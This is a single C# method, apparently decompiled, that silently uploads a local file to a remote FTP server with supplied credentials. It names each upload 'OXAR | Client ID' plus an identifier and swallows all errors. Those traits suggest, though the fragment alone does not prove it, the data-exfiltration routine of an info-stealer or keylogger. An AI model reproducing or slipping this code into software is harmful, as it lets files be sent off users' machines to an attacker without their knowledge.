	public void transferFtp(string fileName, string host, string username, string password)
	{
		FileInfo fileInfo = new FileInfo(fileName);
		_ = "ftp://" + host + "/" + fileInfo.Name;
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri("ftp://" + host + "/OXAR | Client ID : " + k + ".txt"));
		try
		{
			ftpWebRequest.Credentials = new NetworkCredential(username, password);
			ftpWebRequest.KeepAlive = false;
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.ContentLength = fileInfo.Length;
			int count = 2048;
			byte[] buffer = new byte[2048];
			FileStream fileStream = fileInfo.OpenRead();
			Stream requestStream = ftpWebRequest.GetRequestStream();
			for (int num = fileStream.Read(buffer, 0, 2048); num != 0; num = fileStream.Read(buffer, 0, count))
			{
				requestStream.Write(buffer, 0, num);
			}
			requestStream.Close();
			fileStream.Close();
		}
		catch (Exception)
		{
		}
	}

